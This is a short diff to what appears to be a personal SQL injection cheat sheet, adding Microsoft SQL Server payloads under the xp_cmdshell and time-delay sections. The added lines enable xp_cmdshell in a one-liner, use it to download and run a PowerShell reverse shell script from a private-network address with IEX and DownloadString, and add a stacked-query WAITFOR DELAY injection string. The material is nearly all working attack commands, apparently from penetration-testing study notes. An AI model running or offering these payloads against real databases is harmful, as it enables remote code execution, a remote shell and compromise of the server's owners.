@@ -70,8 +70,15 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 EXECUTE xp_cmdshell 'whoami';
 RECONFIGURE;
 
+sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Oneliner
+
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.243:80/rev.ps1") | powershell -noprofile'
+# Run reverse shell
+
 ### Time Delay
 WAITFOR DELAY '0:0:10'
+a'; WAITFOR DELAY '0:0:4'-- 
 
 ####################
 ###### POSTGRE
